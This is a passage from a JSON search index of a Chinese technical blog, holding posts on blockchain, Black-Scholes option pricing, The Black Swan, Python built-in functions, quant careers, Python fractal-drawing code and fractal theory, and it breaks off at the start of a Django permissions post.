block）。\n九天以后，中本聪向密码学家哈尔·芬尼转账了一笔比特币，这是人类历史上第一次摆脱第三方金融信托机构而完成的点对点交易。\n2010年，维基解密宣布接受用比特币的捐款，社区一片欢呼，中本聪出人意料地提出了反对意见，认为比特币项目需要平静地成长。\n2010年的12月12日，中本聪在比特币论坛发布了他最后一个帖子，其后，他在网络上的公开活动频率也逐渐降低。直到2011年4月，他发布了最后一项公开声明，宣称自己“已经开始专注于其他事情”。\n3. 区块链技术 区块链本质上是一个去中心化的分布式账本数据库，一个可以在多个站点、不同地理位置或者多个机构组成的网络里进行分享的资产数据库。这种数据库天生的就很难被攻击，因为它没有用单一的数据库去存储记录，而是保留了同一个数据库的多个共享副本，因此黑客攻击必须同时针对所有副本才能生效。\n区块链技术有潜力帮组政府征税、发放福利、发行护照、登记土地所有权、保证货物供应链的允许，并从整体上确保政府记录和服务的正确性。根据账本的特性，它可能包含从金融、家庭和健康信息在内的个人机密记录。区块链技术有机会为这些数据提供比现有的数据库技术更好的安全性。分布式账本分为，无需许可的（任何人都可以添加区块），和许可的（指定的人才能添加区块）。\n3.1 区块链技术特征 通过加密技术对账。广播交易信息之后，每个节点都会在自己的账本上更新信息。 数据复制。分布式存储，数据多备份。通过对账计算，可以证实数据的正确性与否。 访问控制。使用密钥和签名来管理能够进入账本的人和记录。 透明而私密。节点有备份，同时能够验证数据的真伪。从而使得，人们可以公开私密的信息，而不担心被篡改。 3.2 区块链技术的应用 区块链技术能够使得公司和政府更高效的运作，不用担心高昂的对账和备份成本。区块链技术可能会颠覆以货币和价值转移为核心的传统金融服务。区块链技术系统对于任何成绩结构都带来了挑战，因为其建立的是一种分布式网络，没有任何需要被信任或者必要的的中心机构存在。区块链技术已经对私营公司如何管理数据、如何与顾客和供应商进行互动这些方面产生了深远的影响。如果在政府内应用这种技术，它可以降低成本、提高透敏度、提高公民普惠金融的程度，最终刺激创新和经济增长。降低运作成本，包括减少付款过程的欺诈与错误。政府机构与公民之间的交易有更高的透明度。对当前游走于金融系统边缘的人们能带来更高的普惠金融。区块链支持数据的脱媒，能显著减少复杂性和成本。区块链技术，可以为目前全球资金转移方式的缓慢、费用昂贵和不可靠问题提供解决方案。\n3.3 智能合约 一个智能合约是一套以数字形式定义的承诺，包括合约参与方可以在上面执行这些承诺的协议。工作原理类似于其它计算机程序的if-then语句。智能合约只是以这种方式与真实世界的资产进行交互。当一个预先编好的条件被触发时，智能合约执行相应的合同条款。区块链为智能化合约提供了可信的数据记录方式。\n3.4 物联网 在应用区块链技术之前，建立可信的物联网络是见成本很高的事情。区块链技术，不仅能够为记录所有物联单元的数据提供合适的解决方案，同时还能保证一旦数据被记录，之后将不可以再更改。\n4. 参考 2016年1月19日，英国政府《分布式账本技术：超越区块链》\n","description":"","id":585,"section":"post","tags":["博文","思考","数据"],"title":"区块链：信用成本降低引发的一场革新","uri":"https://www.chenshaowen.com/blog/block-chain-an-innovation-triggered-by-credit-cost-reduction.html"},{"content":"1. Black-Scholes 期权定价模型的意义 Black-Scholes 模型以及它的一些变形已被期权交易商、投资银行、金融管理者、保险人等广泛使用。衍生工具的扩展使国际金融市场更富有效率，但也促使全球市场更加易变。新的技术和新的金融工具的创造加强了市场与市场参与者的相互依赖，不仅限于一国之内还涉及他国甚至多国。结果是一个市场或一个国家的波动或金融危机极有可能迅速的传导到其它国家乃至整个世界经济之中。我国金融体制不健全、资本市场不完善，但是随着改革的深入和向国际化靠拢，资本市场将不断发展，汇兑制度日渐完善，企业也将拥有更多的自主权从而面临更大的风险。因此，对规避风险的金融衍生市场的培育是必需的，对衍生市场进行探索也是必要的，我们才刚刚起步。\n2. 期权定价的方法 股票期权虽然早在19世纪即已经在美国产生。但是，在1973年前，这种交易都分散在各店头市场进行，交易的品种十分单一，交易的规模也相当有限。在1973年之前所交易的股票期权只有看涨期权，而没有看跌期权。因此，直到1968年，在美国成交的股票期权合约所代表的股票的数量，还只是纽约证券交易所成交股票数量的1%。1937年4月26日，全世界第一个集中性的期权市场——芝加哥期权交易所正式成立。\n3. 二叉树定价法 二叉树期权定价模型最早由考克斯（Cox）、罗斯（Ross）和鲁宾斯坦（Rubinstein）(1979年)提出的，他们所依据的原则是无套利原则以及风险中性原则。这个模型有许多优点：它是一个简单模型，易编程，而且能适用于数据量大且复杂的期权定价。它可以多角度地透析期权定价，如果扩展到多时期，二项式模型将成为评估那些未来现金流依赖其他资产市价的期权价值的强有力方法。\n二项期权定价模型假设股价波动只有向上和向下两个方向，且假设在整个考察期内，股价每次向上(或向下)波动的概率和幅度不变。模型将考察的存续期分为若干阶段，根据股价的历史波动率模拟出正股在整个存续期内所有可能的发展路径，并对每一路径上的每一节点计算权证行权收益和用贴现法计算出的权证价格。对于美式权证，由于可以提前行权，每一节点上权证的理论价格应为权证行权收益和贴现计算出的权证价格两者较大者。\n4. 蒙特卡罗模拟 期权定价的蒙特卡洛方法的理论依据是风险中性定价原理，理论基础是概率论与数理统计，其实质是通过模拟标的资产价格路径预测期权的平均回报并得到期权价格估计值。一般地，期权定价的蒙特卡洛模拟方法包含以下几步（以欧式看涨期权为例）：\n在风险中性测度下模拟标的资产的价格从初始时刻开始至到期日止的一条随机路径。 计算在这条路径下期权的到期回报，并根据无风险利率求得回报的贴现。 重复前两步，得到大量期权回报贴现值的抽样样本。 求样本均值，得到期权价格的蒙特卡洛模拟值。 5. Black-Scholes期权定价模型 第一个完整的期权定价模型由迈伦·斯克尔斯(Myron Scholes)与费雪·布莱克(Fischer Black)创立并于1973年公之于世。创立和发展的布莱克——斯克尔斯期权定价模型(Black Scholes Option Pricing Model)为包括股票、债券、货币、商品在内的新兴衍生金融市场的各种以市价价格变动定价的衍生金融工具的合理定价奠定了基础。\n5.1 Black-Scholes模型假设 证券价格遵循几何布朗运动，在每个小区间内的收益率服从正态分布，且不同的两个区间内相互独立 。在期权有效期内，证券价格的方差和无风险利率为常数。 允许卖空，所得资金可以自由使用。 没有交易费用和税收，所有证券都是完全可分的 在衍生证券有效期内标的证券没有现金收益支付 不存在无风险套利机会 证券交易是连续的，价格变动也是连续的 在衍生证券有效期内，无风险利率为常数 欧式期权。欧式期权只能在到期日执行。 5.2 Black-Scholes模型公式 \\begin{equation}\n\\frac{\\partial \\mathrm C}{ \\partial \\mathrm t } + \\frac{1}{2}\\sigma^{2} \\mathrm S^{2} \\frac{\\partial^{2} \\mathrm C}{\\partial \\mathrm C^2}+ \\mathrm r \\mathrm S \\frac{\\partial \\mathrm C}{\\partial \\mathrm S}\\ =\\mathrm r \\mathrm C \\label{eq:1}\n\\end{equation}\n可以计算出欧式期权的价格\n\\[C(S,t)= N(d_1)S - N(d_2)Ke^{-rt}\\]\n\\begin{equation}\n\\mathrm d_1= \\frac{1}{\\sigma \\sqrt{\\mathrm t}} \\left[\\ln{\\left(\\frac{S}{K}\\right)} + t\\left(r + \\frac{\\sigma^2}{2} \\right) \\right]\n\\end{equation}\n\\begin{equation}\n\\mathrm d_2= \\frac{1}{\\sigma \\sqrt{\\mathrm t}} \\left[\\ln{\\left(\\frac{S}{K}\\right)} + t\\left(r - \\frac{\\sigma^2}{2} \\right) \\right]\n\\end{equation}\n\\begin{equation}\nN(x)=\\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{x} \\mathrm e^{-\\frac{1}{2}z^2} dz\n\\end{equation}\nC = 期权初始合理价格；\nS = 当前股价\nK = 期权交割价格\nr = 无风险利率（0到1之间的数字）\n\\(\\sigma\\) = 股票波动率回报（0和1之间的数字）\nt = 期权到期期限（年）\nN = 正态累积分布函数\n5.3 Black-Scholes期权计算示例 股票现价42元，欧式期权的执行价格为40元，时间为6个月后，无风险利率为每年10%，该股票波动率为每年20%。也就是S=42,K=40,r=0.10,\\(\\sigma\\)=0.20，t=0.5。\n带入公式：\n\\begin{equation}\n\\mathrm d_1= \\frac{1}{0.2 \\sqrt{\\mathrm 0.5}} \\left[\\ln{\\left(\\frac{42}{40}\\right)} + 0.5\\left(0.10 + \\frac{0.2^2}{2} \\right) \\right]=0.7693\n\\end{equation}\n\\begin{equation}\n\\mathrm d_2= \\frac{1}{0.2 \\sqrt{\\mathrm 0.5}} \\left[\\ln{\\left(\\frac{42}{40}\\right)} + 0.5\\left(0.10 - \\frac{0.2^2}{2} \\right) \\right]=0.6278\n\\end{equation}\n如果该期权为看涨期权，它的C价值为：\n\\[ C_1= N(0.7693) \\times 42 - N(0.6278)\\times 40 \\times e^{-0.1 \\times 0.5} = 4.76 \\]\n如果该期权为看跌期权，它的C价值为：\n\\[ C_2= N(-0.6278)\\times40\\times e^{-0.1\\times 0.5}-N(-0.7693)\\times 42 = 0.81 \\]\n6. 参考 wiki:布莱克-舒尔兹模型 ","description":"","id":586,"section":"post","tags":["金融","交易","整理","期权","定价"],"title":"Black-Scholes 期权定价模型","uri":"https://www.chenshaowen.com/blog/black-scholes-option-pricing-model.html"},{"content":"英文书名: The Black Swan\n副标题: 如何应对不可预知的未来\n作者: 纳西姆·尼古拉斯·塔勒布（Nassim Nicholas Taleb）\n译者: 万丹\n出版社: 中信出版社\n出版年: 2009-8\nISBN: 9787508616018\nNotes:\n作者以自身经历，黎巴嫩战争，记者的战争日记，股票崩盘，叶夫根尼亚的书为切入。切身描述这个处于不确定性中的世界。\n你不知道的事比你知道的事更有意义。几乎社会生活中的一切都是由极少发生但影响重大的震动和飞跃产生的。\n我们的世界是由极端、未知和非常不可能发生的事情主导的，而我们却一直把时间花在讨论琐碎的事情上，只关注已知和重复发生的事情。\n同时，警示。\n人类思维的三个毛病：假想的理解，反省的偏差，高估事实性信息的价值。\n大部分我们归功于技巧的东西只是事后的解释。\n错误的把过去的一次天真观察当成某种确定的东西或者代表未来的东西，是我们无法把握黑天鹅现象的唯一原因。\n我们冒险通常不是出于自信，而是出于无知和对不确定性的无视。\n我们在自以为是拥有的知识方面非常的自大。\n作者还提出来两个概念，平均斯坦，奇异斯坦。平均斯坦是不受黑天鹅事件影响的事件，而小概率的黑天鹅事件直接决定着奇异斯坦的结果。\n作者认为人们最大的认知问题在，把所有事件当做平均斯坦来处理。但是，事实并不总是符合平均斯坦，教科书中，常提到的高斯分布也不总是符合事实。\n人们被理想化的公式所束缚，想象着一切都能够预估，风险可控。事实却常常打脸。我们要具备批判的精神。\n","description":"","id":587,"section":"post","tags":["书籍","金融","人生"],"title":"黑天鹅","uri":"https://www.chenshaowen.com/blog/book/the-black-swan.html"},{"content":" 函数 描述 abs(number) 返回一个数的绝对值 apply(function[, args[, kwds]]) 调用给定函数，可选择提供参数 all(iterable) 如果所有iterable的元素均为真则返回True, 否则返回False any(iterable) 如果有任一iterable的元素为真则返回True，否则返回False basestring() str和unicode抽象超类，用于检查类型 bool(object) 返回True或False，取决于Object的布尔值 callable(object) 检查对象是否可调用 chr(number) 返回ASCII码为给定数字的字符 classmethod(func) 通过一个实例方法创建类的方法 cmp(x, y) 比较x和y——如果xy则返回证书；如果x==y，返回0 complex(real[, imag]) 返回给定实部（以及可选的虚部）的复数 delattr(object, name) 从给定的对象中删除给定的属性 dict([mapping-or-sequence]) 构造一个字典，可选择从映射或（键、值）对组成的列表构造。也可以使用关键字参数调用。 dir([object]) 当前可见作用于域的（大多数）名称的列表，或者是选择性地列出给定对象的（大多数）特性 divmod(a, b) 返回(a//b, a%b)（float类型有特殊规则） enumerate(iterable) 对iterable中的所有项迭代（索引，项目）对 eval(string[, globals[, locals]]) 对包含表达式的字符串进行计算。可选择在给定的全局作用域或者局部作用域中进行 execfile(file[, globals[, locals]]) 执行一个python文件，可选在给定全局作用域或者局部作用域中进行 file(filename[, mode[, bufsize]]) 创建给定文件名的文件，可选择使用给定的模式和缓冲区大小 filter(function, sequence) 返回给定序列中函数返回值的元素的列表 float(object) 将字符串或者数值转换为float类型 frozenset([iterable]) 创建一个不可变集合，这意味着不能将添加到其它集合中 getattr(object, name[, default]) 返回给定对象中所指定的特性的值，可选择给定默认值 globals() 返回表示当前作用域的字典 hasattr(object, name) 检查给定的对象是否有指定的属性 help([object]) 调用内建的帮助系统，或者打印给定对象的帮助信息 id(number) 返回给定对象的唯一ID input([prompt]) 等同于eval(raw_input(prompt) int(object[, radix]) 将字符串或者数字（可以提供基数）转换为整数 isinstance(object, classinfo) 检查给定的对象object是否是给定的classinfo值的实例，classinfo可以是类对象、类型对象或者类对象和类型对象的元组 issubclass(class1, class2) 检查class1是否是class2的子类（每个类都是自身的子类） iter(object[, sentinel]) 返回一个迭代器对象，可以是用于迭代序列的object_iter()迭代器（如果object支持getitem方法的话），或者提供一个sentinel，迭代器会在每次迭代中调用object，直到返回sentinel len(object) 返回给定对象的长度（项的个数） list([sequence]) 构造一个列表，可选择使用与所提供序列squence相同的项 locals() 返回表示当前局部作用域的字典（不要修改这个字典） long(object[, radix]) 将字符串（可选择使用给定的基数radix）或者数字转化为长整型 map(function, sequence, \u0026hellip;) 创建由给定函数function应用到所提供列表sequence每个项目时返回的值组成的列表 max(object1, [object2, \u0026hellip;]) 如果object1是非空序列，那么就返回最大的元素。否则返回所提供参数（object1,object2\u0026hellip;）的最大值 min(object1, [object2, \u0026hellip;]) 如果object1是非空序列，那么就返回最小的元素。否则返回所提供参数（object1,object2\u0026hellip;）的最小值 object() 返回所有新式类的技术Object的实例 oct(number) 将整型数转换为八进制表示的字符串 open(filename[, mode[, bufsize]]) file的别名（在打开文件的时候使用open而不是file ord(char) 返回给定单字符（长度为1的字符串或者Unicode字符串）的ASCII值 pow(x, y[, z]) 返回x的y次方，可选择模除z property([fget[, fset[, fdel[, doc]]]]) 通过一组访问器创建属性 range([start, ]stop[, step]) 使用给定的起始值（包括起始值，默认为0）和结束值（不包括）以及步长（默认为1）返回数值范围（以列表形式） raw_input([prompt]) 将用户输入的数据作为字符串返回，可选择使用给定的提示符prompt reduce(function, sequence[, initializer]) 对序列的所有渐增地应用于给定的函数，使用累积的结果作为第一个参数，所有的项作为第二个参数，可选择给定的起始值（initializer） reload(module) 重载入一个已经载入的模块并将其返回 repr(object) 返回表示对象的字符串，一般作为eval的参数使用 reversed(sequence) 返回序列的反向迭代器 round(float[, n]) 将给定的浮点数四舍五入，小数点后保留n位（默认为0） set([iterable) 返回从iterable（如果给出）生成的元素集合 setattr(object, name, value) 设定给定对象的指定属性的值为给定的值 sorted(iterable[, cmp][,key][, reverse]) 从iterable的项目中返回一个新的排序后的列表。可选的参数和列表方法与sort中的相同 staticmethod(func) 从一个实例方法创建静态（类）方法 str(object) 返回表示给定对象object的格式化好的字符串 sum(seq[, start]) 返回添加到可选参数start（默认为0）中的一系列数字的和 super(type[, obj/type) 返回给定类型（可选为实例化的）的超类 tuple([sequence]) 构造一个元祖，可选择使用同提供的序列sequence一样的项 type(object) 返回给定对象的类型 type(name, base, dict) 使用给定的名称、基类和作用域返回一个新的类型对象 unichr(number) chr的Unicode版本 unicode(object[, encoding[, errors]]) 返回给定对象的Unicode编码版本，可以给定编码方式和处理错误的模式（\u0026lsquo;strict\u0026rsquo;、\u0026lsquo;replace\u0026rsquo;或者\u0026rsquo;ignore\u0026rsquo;，\u0026lsquo;strict\u0026rsquo;为默认模式） vars([object]) 返回表示局部作用域的字典，或者对应给定对象特性的字典 xrange([start, ]stop[, step]) 类似于range，但是返回的对象使用内存较少，而且只用于迭代 zip(sequence1, \u0026hellip;) 返回元组的列表，每个元组包括一个给定序列中的项。返回的列表的长度和所提供的序列的最短长度相同 详情请前往:http://python.usyiyi.cn\n","description":"","id":588,"section":"post","tags":["Python","API","整理","函数"],"title":"Python中常见的内建函数","uri":"https://www.chenshaowen.com/blog/built-in-functions-in-python.html"},{"content":"1. Quant的工作内容 Quant的工作就是设计并实现金融的数学模型，包括衍生物定价，风险估价或预测市场行为等。\n2. Quant的种类 Desk quant，开发直接被交易员使用的价格模型。 优势是接近交易中所遇到的money和机会。劣势是压力很大。 Model validating quant，独立开发价格模型。不过是为了确定desk quant开发的模型的正确性。优势是更轻松，压力比较小。劣势是这种小组会比较没有作为而且远离money。 Research quant，尝试发明新的价格公式和模型，有时还会执行blue-sky research(不太清楚是什么)。 优势是比较有趣(对喜欢这些人来说)，而且你学到很多东西。劣势是有时会比较难证明有你这个人存在(跟科学家一样，没有什么大的成果就没人注意你) 。 Quant developer，其实就是名字被美化的程序员,但收入很不错而且很容易找到工作. 这种工作变化很大. 它可能是一直在写代码,或者调试其他人的大型系统。 Statistical arbitrage quant，在数据中寻找自动交易系统的模式(就是套利系统). 这种技术比起衍生物定价的技术有很大的不同, 它主要用在对冲基金里. 而且这种位置的回报是极不稳定的。 Capital quant，建立银行的信用和资本模型. 相比衍生物定价相关的工作,它没有那么吸引人,但是随着巴塞尔II银行协议的到来,它变的越来越重要. 你会得到不错的收入(但不会很多),更少的压力和更少的工作时间. 3. 怎样成为一名合格的Quant 作为一名合格的Quant，数学、编程、金融三者缺一不可。数学是思想，金融是原理，编程是手段，三者合一，是谓金融工程。\n数学：Quant分两大门派：P Quant与Q Quant。Q是指风险中性测度。风险中性的意思主要是说历史数据不能帮助你预测未来的走势，所以你的决策是没有风险补偿的。由此而得的模型可以给出漂亮的数学性质，而且可以在缺乏数据的情况下得到一些结论。涉及的数学技术主要是随机过程，偏微分方程之类。P是指真实概率测度。所谓真实，主要是说模型依赖的概率分布是从历史数据上估算出来的。这套方法主要依赖数据，数据量越大估算的效果越好。涉及的技术主要是时间序列（ARIMA，GARCH之类），Bayesian，以及现在流行的机器学习等方法。\n书籍推荐：Stein的傅立叶分析、复分析、实分析、泛函分析。钟开莱的《初等概率论》。Steven Shreve的《Stochastic Calculus for finance》。科尔多森的《随机微分方程》。Duffie的《Dynamic Asset Pricing Model》。\n金融：基本的金融工程知识，对衍生品定价，设计套利策略，风险管理等等。\n书籍推荐：John Hull的《期权、期货以及其他衍生品》。《Exotic Option》，《An Option Greeks Primer》，《Active Portfolio Management》。博迪的《投资学》。Paul Glasserman的《Monte Carlo Methods in Financial Engineering》。麦基尔的《漫步华尔街》。柯蒂斯·费思的《海龟交易法则》。罗伯特·帕多的《交易策略评估与最佳化》。欧内斯特·陈《量化交易——如何建立自己的算法交易事业》。\n编程：基本的数据结构和算法，道数组，链表，哈希表这些数据结构的原理和区别，能够自己实现一些基本的搜索，排序算法，能帮助你正确的估算程序运行时间和需要的内存等资源，出现性能瓶颈的时候也可以自己分析。对一些进程间通信的方式，比如文件，socket，或者共享内存，应该有基本的理解，这会让你能够组合不同的工具（比如Excel和C++）来实现复杂的功能，很多时候这些小组合会让你事半功倍。语言的话，建议学习Python、C++。\n书籍推荐：有关Python、C++语言和数据处理的书籍均可。《Python数据分析基础教程：NumPy学习指南》，《利用Python进行数据分析》\n4. Quant的前景 中国的市场在高频交易、对冲、市场开放度等方面跟国外差距甚大，很多Quant的传统领域或现在的前沿领域无法应用。大量的公司储备Quant，其实是在储备研究结果，现在无法发挥威力。\n在一个市场由散户主导，向机构主导转变的过程中，数量化策略及数量化风险控制的兴起是必然趋势。\n当前，国内金融市场的量化交易大概占到市场交易量的20%（比较早的数据），同时每年都在增加。从国外的情况来看，70%的金融市场交易量由程序化交易完成，而国内才刚刚起步。\nQuant 的职位主要集中在投资银行、对冲基金、商业银行和金融机构。总体来说工作相对辛苦，收入比其他行业高很多。以Quant Developer为例，虽然实际工作和其他行业的程序员没有本质区别，但不仅收入高，而且很容易找到工作。\n","description":"","id":589,"section":"post","tags":["金融","宽客","整理","什么是"],"title":"什么是 Quant","uri":"https://www.chenshaowen.com/blog/what-is-the-quant.html"},{"content":"1. Koch曲线 瑞典数学家Helge von Koch，在1904年发表的“从初等几何构造的一条没有切线的连续曲线”的论文中提出Korch曲线。它的描述如下：\n指定一条线段的长度\\(l\\)（可以理解为第0次迭代） 将这条线段三等分，并以中间的线段为底边构造一个等边三角形，然后去掉底边 对2中生成的曲线的每一条边重复2的操作（每操作一次称为一次迭代） 最终得到的集合图形长度为：$$L=l*(\\frac{4}{3})^{N}$$，其中的N指的是迭代次数。\n1.2 绘制方法： 如果N=0，直接画出L长的直线即可 如果N=1（第一次迭代），画出长度为L/3的线段；画笔向左转60度再画长度为L/3长的线段；画笔向右转120度画长度为L/3长的线段；画笔再向左转60度画出长度为L/3的线段 如果n\u0026gt;1，第n次迭代相当于：n-1次迭代；画笔左转60度；n-1次迭代；画笔右转120度；n-1次迭代；画笔左转60度；n-1次迭代。 1.3 Python代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # -*- coding: utf-8 -*- import turtle Division = 3.0 DirectionAangle = [(\u0026#39;left\u0026#39;,60),(\u0026#39;right\u0026#39;,120),(\u0026#39;left\u0026#39;,60)] def call(name): if name == \u0026#39;left\u0026#39;: return turtle.left else: return turtle.right def koch(n, length): if n==0: turtle.forward(length) else: for DA in DirectionAangle: koch(n-1,length/Division) call(DA[0])(DA[1]) koch(n-1,length/Division) koch(n=2, length=100) turtle.done() 1.4 绘制的图形 下面分别是n=3, length=300和n=4, length=400生成的Koch曲线\n2. Julia集 2.1 绘制方法 在上一篇博文中提到过，点击前往\n设定初值 p,q, 最大的迭代次数 N, 图形的大小 a,b, 及使用的颜色数 K.这里需要注意的是c的模总是小于2。可以证明当c的模大于2时，进行迭代必将发散到无穷。 设定区域的界值 \\( M\\ge max(2,\\sqrt{p^2+q^2}) \\) 将区域\\(R=[-M,M]\\times[-M,M]\\)分成\\(a\\times b\\)的网格，分别以每个网格点为初值(\\(x_0,y_0\\))。利用上面替换之后的公式做迭代。如果对\\(n \\le N\\)所有的都有\\({x_n}^2+{y_n}^2\\le M^2 \\)，则将象素\\((i, j)\\)置为这一种颜色。如果从某一步 n 开始\\({x_n}^2+{y_n}^2\\ge M^2 \\)，则将象素 \\((i, j)\\)置为不同颜色。 2.2 Python代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # -*- coding: utf-8 -*- import matplotlib.pyplot as plot import numpy as np p=0.45 #初始值c的实部 q=-0.1428 #初始值c的虚部 N=800 #最大迭代次数 M=100 #迭代区域的界值 a=3.0 #绘制图的横轴大小 b=3.0 #绘制图的纵轴大小 step=0.005 #绘制点的步长 def iterate(z,N,M): z=z*z+c for i in xrange(N): if abs(z)\u0026gt;M: return i z=z*z+c return N c=p+q*1j i=np.arange(-a/2.0,a/2.0,step) j=np.arange(b/2.0,-b/2.0,-step) I,J=np.meshgrid(i, j) ufunc=np.frompyfunc(iterate,3,1) Z=ufunc(I+1j*J,N,M).astype(np.float) plot.imshow(Z,extent=(-a/2.0,a/2.0,-b/2,b/2.0)) cb = plot.colorbar(orientation=\u0026#39;vertical\u0026#39;,shrink=1) cb.set_label(\u0026#39;iteration counts\u0026#39;) plot.show() 2.3 绘制的图形 参数：p=0.285 q=0.01 N=200 M=100 a=2.0 b=2.0 step=0.005 (左图)\n参数：p=0.45 q=-0.1428 N=200 M=100 a=2.0 b=2.0 step=0.005 (右图)\n还有其他的初始c值可以绘制出十分漂亮的图案，例如：\nc = -0.70176+-0.3842j\nc = -0.835+-0.2321j\nc = -0.8+0.156j\nc = 0.285\n3. Mandelbrot集 数学定义：\n$$f_c(z) = z^2+c$$\nMandelbrot集是\\(f_c(z)\\)在z=0，关于复数c=x+yi的函数迭代不发散序列集合。\n绘制Mandelbrot集最简单的方法是使用逃逸时间进行绘制。逃逸时间指的是，在指定范围M进行有限次数N迭代，而不超出M区域的次数。使用不同的颜色绘制不同的迭代次数。\n设置迭代的最多次数，N 设置初始化\\(z_0\\)的值， 设置逃逸半径R的值，通常为2 3.1 绘制方法 3.2 Python实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # -*- coding: utf-8 -*- import numpy as np import matplotlib.pyplot as plot x0=0 #初始值z0的x0 y0=0 #初始值z0的y0 zoom=1.0 #放大倍率 N=100 #最大迭代次数 R=2 #迭代半径 a=4.0 #绘制图的横轴大小 b=3.0 #绘制图的纵轴大小 step=0.005 #绘制点的步长 def iterate(c,N,R): z=c for i in xrange(N): if abs(z)\u0026gt;R: return i z = z*z+c return N x=np.arange(-a/(2.0*zoom)+x0,a/(2.0*zoom)+x0,step) y=np.arange(b/(2.0*zoom)+y0,-b/(2.0*zoom)+y0,-step) cx,cy=np.meshgrid(x, y) c = cx + cy*1j ufunc=np.frompyfunc(iterate,3,1) Z=ufunc(c,N,R).astype(np.float) plot.imshow(Z,extent=(-a/2.0,a/2.0,-b/2,b/2.0)) cb = plot.colorbar(orientation=\u0026#39;vertical\u0026#39;,shrink=1) cb.set_label(\u0026#39;iteration counts\u0026#39;) plot.show() 3.3 绘制的图形 图中是使用参数：x0=0 y0=0 zoom=1.0 N=100 R=2 a=4.0 b=3.0 step=0.005。生成的图像。不同的是，它们依次使用的是二次、三次幂的迭代。\n最后，还可以使用ImageMagick工具，将生成的图像制作成一个动态GIF。\n1 convert *.png out.gif ","description":"","id":590,"section":"post","tags":["博文","Python","数学","Demo"],"title":"使用 Python 绘制分形: Koch 曲线、Julia 集、Mandelbrot 集","uri":"https://www.chenshaowen.com/blog/drawing-2d-fractal-graph-using-python.html"},{"content":"1. 分形理论 1.1 分形的定义 分形，通常指一个几何形状，可以分成数个部分，而每一部分都近似地是整体缩小后的形状，即具有自相似的性质。\n1.2 分形研究的历史 公元17世纪，莱布尼茨就思考过自相似的问题。公元18世纪卡尔·魏尔施特拉斯、格奥尔格·康托尔和费利克斯·豪斯多夫对连续而不可微函数的研究，对分形使用严格的数学处理。\n而近代分形热的形成离不开曼德波罗。1967年，法国裔数学家本华.曼德波罗注意到，如果用公里作为测量单位，从几米到几十米的一些曲折地段会被忽略；改用米来做单位，测得的总长度会增加，但一些厘米量级以下的曲折地段还是不能反映出来；进一步，从理论上来说，海边沙砾的下一个尺度是分子、原子，于是要使用更小数量级的尺度的话，得到的海岸线总长度就很不一样。因此，长度不是海岸线的与尺度无关的不变量。曼德波罗引进了“分数维图形”的新概念，建立了今天熟知的分形几何理论。\n1975 年开始， 他陆续出版了著作《分形：形状、机遇和维数》和《大自然的分形几何》。曼德波罗的书完全没有得到学术界应有的重视， 直到1982年后，才受到欧美社会的广泛关注，后来被分形学界视为“分形学之圣经”。\n1.3 欧几里得几何与分形几何的比较 欧几里得几何 分形几何 经典的（ 2000多年的历史 现代数学怪物（ 30多年的历史） 基于特征长度与比例 无特征长度与比例 适合于人工制品 实用于大自然现象 用公式描述 用（递归或迭代）算法描述 图形规则 图形不规则 图形的结构层次有限 图形的结构层次无限 局部一般不具有整体的信息 局部往往具有整体的信息 图形越复杂，背后的规则也越复杂 图形复杂，其背后的规则经常是简单的 2. 理解分形 2.1 分形的测度维 一个维数为d的物体：度量单位变化为原来\\(\\frac{1}{r}\\)后，物体个数增加为\\(r^d\\)。如果用对数表示，d为维数，r为度量放大倍数，k为体积放大倍数，那么\n$$d=log k/log r$$\n示例：\n把线段放大两倍后，所得线段可以看成是2个原来的线段叠加而成 把正方形放大两倍后，所得正方形可以看成是\\(2^2\\)个原来的正方形叠加而成 把立方体放大两倍后，所得立方体可以看成是\\(2^3\\)个原来的立方体叠加而成。 2.2 Julia集和Mandelbrot集 考虑复变函数迭代 $$Z_{n+1} = {Z_n}^2+c, n=0,1,2……(1) $$\n固定复参数 c，使得迭代序列{\\(Z_n\\)}有界的初值\\(Z_0\\)在复平面上的分布图形称为Julia集，亦即\\(J_c=\\) { \\(Z_0|迭代序列 \\){\\(Z_n\\)}\\(有界 \\) }\n固定初值\\(Z_0\\)，使得迭代序列（1）有界的参数c在复平面上的分布图形称为Mandelbrot集。即\\(J_c=\\) { \\(c|迭代序列 \\){\\(Z_n\\)}\\(有界 \\) }。记 $$Z=x+iy, c=p+iq$$\n则（1）变为\n$${\nx_{n+1}={x_n}^2-{y_n}^2+p \\\\\ny_{n+1}=2x_ny_n+q\n}$$\nJulia 集的绘制方法：\n设定初值 p,q, 最大的迭代次数 N, 图形的大小 a,b, 及使用的颜色数 K.这里需要注意的是c的模总是小于2。可以证明当c的模大于2时，进行迭代必将发散到无穷。 设定区域的界值 \\( M\\ge max(2,\\sqrt{p^2+q^2}) \\) 将区域\\(R=[-M,M]\\times[-M,M]\\)分成\\(a\\times b\\)的网格，分别以每个网格点为初值(\\(x_0,y_0\\))。利用上面替换之后的公式做迭代。如果对\\(n \\le N\\)所有的都有\\({x_n}^2+{y_n}^2\\le M^2 \\)，则将象素\\((i, j)\\)置为这一种颜色。如果从某一步 n 开始\\({x_n}^2+{y_n}^2\\ge M^2 \\)，则将象素 \\((i, j)\\)置为不同颜色。 还有一个有趣的定理：一个 Julia 集要么是完全连通的，任意两点间都有一条通路；要么是完全不连通的，整个图形全是一个个孤立的点。\nMandelbrot集的绘制方法：\n算法上和Julia完全一样，只不过这时固定的是x,y值，初始值，而把c当做变量。Mandelbrot集内的每一个点就对应了一个连通的Julia集，Mandelbrot 集合外的点则对应了不连通的 Julia 集，Mandelbrot图是Julia的缩略图。\n由此想象，我们有x,y,p,q四个变量，任意限定其中两个，另外两个当做变量都可以得到不同的图形。如果把全部Julia集合起来，会得到一个四维图形。\n3. 参考 维基百科-分形 再谈Julia集与Mandelbrot集 ","description":"","id":591,"section":"post","tags":["博文","图","数学"],"title":"分形理论","uri":"https://www.chenshaowen.com/blog/fractal-theory.html"},{"content":"1. Django内置权限管理 1.1 权限分类 Permission\n用来定义用户User A对任务Task的权限。 User\n如果User A 对Model B有权限，那么User A 对Mode B中的全部实例都有相应权限。User对象的user_permission 字段用于管理用户的权限。使用 assign_perm 给User分配权限。 Group\n如果Group C 对Model B有权限，那么属于Group　Ｃ的全部User对Model B 都具有相应权限。 1.2 配置和实现 Permission Django定义每个model后，默认都会添加该model的add, 